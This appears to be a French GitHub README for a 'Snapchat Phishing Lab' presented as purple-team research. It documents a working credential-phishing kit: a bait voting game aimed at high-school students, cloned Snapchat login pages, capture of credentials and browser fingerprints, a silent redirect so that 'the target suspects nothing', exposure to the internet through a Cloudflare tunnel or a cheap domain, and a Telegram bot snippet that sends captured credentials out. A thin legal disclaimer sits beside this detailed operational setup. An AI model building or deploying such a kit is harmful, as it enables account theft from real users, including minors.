# Snapchat Phishing Lab — Purple Team Research

**Version :** 3.0  
**Auteur :** Famoussa  
**Usage :** Recherche Purple Team — Sensibilisation utilisateur — Tests ethiques uniquement

---

## ⚠️ Avertissement legal

**INTERDIT STRICTEMENT :**
- Utiliser sur des cibles reelles sans consentement ecrit
- Diffuser les identifiants collectes
- Heberger sur un serveur public sans autorisation
- Tester des sites/services sans permission du proprietaire

**AUTORISE UNIQUEMENT :**
- Tests sur soi-meme
- Tests avec consentement eclaire (contrat signe)
- Recherche academique en environnement isole
- Etude de sensibilisation avec debriefing

---

## 📋 Fonctionnalites

### 🎯 Appat principal — "Classement Secret"
Un jeu interactif de vote anonyme pour les lyceens :
```
Pseudo → Vote Top 3 (5 categories) → Podium WINNER → Validation Snapchat
```

### 🕵️ Phishing Snapchat
- Clone de la page de connexion Snapchat (email + mot de passe)
- Capture des identifiants + fingerprints navigateur
- Auto-redirect vers le vrai Snapchat apres capture (invisible)
- Auto-validation des votes apres capture

### 📊 Dashboard
- Terminal interactif avec surveillance en temps reel
- Statistiques : captures, sessions, taux de conversion
- Export JSON/CSV/Rapport HTML
- Watch Live : voit les identifiants arriver en direct

### 🚇 Cloudflare Tunnel
- Expose le serveur local sur internet
- URL du type `https://truc.trycloudflare.com`
- Auto-download du binaire Windows

---

## 🚀 Installation rapide

### Sur Windows

```powershell
# 1. Installer Python 3.8+ (si pas deja fait)
https://www.python.org/downloads/

# 2. Cloner ou telecharger le projet
cd C:\Users\TonPseudo\Desktop
git clone https://github.com/famoussa81/snapchat-phishing-lab.git
cd snapchat-phishing-lab

# 3. Installer les dependances
pip install -r requirements.txt

# 4. Lancer
python launcher.py
```

### Sur Linux / WSL

```bash
# 1. Cloner
cd ~/Desktop
git clone https://github.com/famoussa81/snapchat-phishing-lab.git
cd snapchat-phishing-lab

# 2. Dependances
pip install -r requirements.txt

# 3. Lancer
python3 launcher.py
```

---

## 🎮 Utilisation

### Menu principal (launcher.py)

```
┌──────────────────────────────────────┐
│            MENU PRINCIPAL            │
└──────────────────────────────────────┘

  [1] Démarrer le serveur local
  [2] Démarrer avec tunnel Cloudflare
  
  [3] Dashboard interactif
  [4] Surveillance en direct (Watch Live)
  
  [5] Exporter les données
  [6] Ouvrir dans le navigateur
  [7] Vérifier la base de données
  
  [8] Réinitialiser toutes les données
  
  [0] Quitter
```

### Flow complet

```
1. Lancer : python launcher.py → [1]
2. Ouvrir http://localhost:8080
3. Le participant voit la page d'accueil "Classement Secret"
4. Choisit un pseudo → Vote 5 categories → Voir le podium
5. Clique "Valider avec Snapchat" → Page login Snapchat
6. Entre email → Suivant → Page mot de passe
7. Entre mot de passe → Capture → Redirige vers vrai Snapchat
8. La cible ne se doute de rien
```

### Watch Live

Dans le launcher, tape `[4]` pour voir les identifiants arriver en temps reel :

```
15:32:45 CAPTURE #3 [password] test@snap.com / momdp123
15:33:12 VOTE   #1 testeur → VALIDÉ
15:33:15 CAPTURE #4 [password] user2@mail.com / pass456
```

---

## 🏗️ Structure du projet

```
snapchat-phishing-lab/
│
├── launcher.py              ← Menu interactif terminal (TUI)
├── main.py                  ← Serveur Flask + API + DB
├── requirements.txt         ← Dependances Python
├── generate.py              ← Script Playwright pour cloner Snapchat
│
├── templates/
│   ├── bait.html            ← Jeu "Classement Secret" (4 etapes)
│   ├── login.html           ← Clone page email Snapchat
│   ├── password.html        ← Clone page mot de passe
│   ├── redirect.html        ← Ecran de transition
│   └── debrief.html         ← Page de remerciement finale
│
├── static/
│   ├── css/                 ← Styles CSS clones
│   ├── js/                  ← Scripts JS clones
│   └── images/              ← Icons et favicons
│
├── config/
│   └── credentials.ini      ← Identifiants Instagram (pour OSINT)
│
├── backups/                 ← Sauvegardes auto de la DB
│
├── captured_credentials.db  ← Base SQLite (creee au 1er lancement)
├── cloudflared.exe          ← Binaire tunnel (auto-download)
└── .admin_key               ← Cle API admin (auto-generee)
```

---

## 📡 Endpoints API

### Pages

| Route | Description |
|-------|-------------|
| `GET /` | Page d'accueil "Classement Secret" |
| `GET /login` | Clone page email Snapchat |
| `GET /password` | Clone page mot de passe |
| `GET /debrief` | Page de remerciement |
| `GET /v2/*` | Proxy vers vrai Snapchat (admin) |

### API Publique

| Route | Methode | Description |
|-------|---------|-------------|
| `/api/log` | POST | Logger des evenements |
| `/api/top3` | POST | Enregistrer les votes Top 3 |
| `/api/capture` | POST | Capture identifiants + fingerprint |
| `/api/classement` | GET | Classement agrege multi-joueurs |
| `/api/classement/my` | GET | Classement perso + general |
| `/api/consent` | POST | Enregistrer consentement |
| `/api/report` | GET | Statistiques globales |

### API Admin (necessite clé dans .admin_key)

| Route | Methode | Description |
|-------|---------|-------------|
| `/export?key=ADMIN_KEY` | GET | Export JSON |
| `/export/csv?key=ADMIN_KEY` | GET | Export CSV |
| `/export/report?key=ADMIN_KEY` | GET | Rapport HTML |
| `/reset?key=ADMIN_KEY` | POST | Reset donnees |
| `/api/dbcheck?key=ADMIN_KEY` | GET | Etat de la DB |
| `/api/captures` | GET | Liste des captures |
| `/api/logs` | GET | Liste des logs |

---

## 🗃️ Base de donnees (SQLite)

### Table `captured_credentials`
Stocke les identifiants captures + fingerprints :
- participant_id, username, password
- ip_address, user_agent
- screen_resolution, timezone, browser_language, platform
- time_on_page, click_count, referrer, step

### Table `votes_top3`
Stocke les votes du jeu Classement Secret :
- participant_id, pseudo, votes_data (JSON)
- snap_validated (0/1), validated_at

### Table `experiment_log`
Trace tous les evenements utilisateur :
- event_type (BAIT_VIEW, REGISTER_PSEUDO, TOP3_VOTE, CAPTURE...)
- participant_id, details (JSON), timestamp

### Table `access_log`
Traces d'acces aux endpoints sensibles

### Table `ip_blacklist`
IP blacklistees apres tentatives echouees

---

## 🔧 Configuration

### Variables d'environnement

| Variable | Defaut | Description |
|----------|--------|-------------|
| `SNAPCHAT_LAB_ADMIN_KEY` | Auto-genere | Cle admin API |
| `SNAPCHAT_LAB_DASHBOARD_PW` | `76247010aidafamoussa` | Mot de passe dashboard |

### Fichier `main.py` — Config

```python
CONFIG = {
    "SERVER_PORT": 8080,           # Port du serveur
    "USE_HTTPS": False,            # HTTPS (necessite cryptography)
    "SNAPCHAT_LOGIN_URL": "...",   # URL du vrai Snapchat
}
```

---

## 🌐 Exposition internet

### Option 1 — Cloudflare Tunnel (recommande)

```powershell
python launcher.py
# Tape [2]
```

Tu reçois : `https://truc.trycloudflare.com`

### Option 2 — Domaine personnalise

1. Achete un domaine (1€ sur Porkbun/Namecheap)
2. Pointe-le vers Cloudflare
3. Modifie le tunnel pour utiliser ton domaine

---

## 📱 Bot Telegram (optionnel)

Pour recevoir les identifiants directement sur ton telephone, configure un bot Telegram :

```python
# Dans main.py, ajoute :
TOKEN = "TON_TOKEN_TELEGRAM"
CHAT_ID = "TON_CHAT_ID"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message})
```

---

## 🔐 Securite

- Admin key auto-generee (64 chars hex)
- IP blacklisting (5 tentatives echouees → bloque)
- Session cookies HttpOnly
- Auto-backup avant reset
- Votes marques comme valides uniquement apres capture

---

## 🧪 Tests

```bash
python3 -c "from main import app, init_database; init_database(); \
with app.test_client() as c: \
    assert c.get('/').status_code == 200; \
    assert c.post('/api/top3', json={'participant_id':'test','pseudo':'t','votes':{}}).status_code == 200; \
    print('All tests passed')"
```

---

## 📦 Dependances

```
flask>=2.3.0
requests>=2.31.0
beautifulsoup4>=4.12.0
playwright>=1.40.0
faker>=18.0.0
colorama>=0.4.6
cryptography>=41.0.0
gunicorn>=21.2.0
```

---

## 📜 Licence

MIT — Usage ethique et educatif uniquement.

---

## 👨‍💻 Auteur

**Famoussa** — Purple Team Researcher  
Projet open-source a but educatif  
Ne pas utiliser pour des activites illegales.
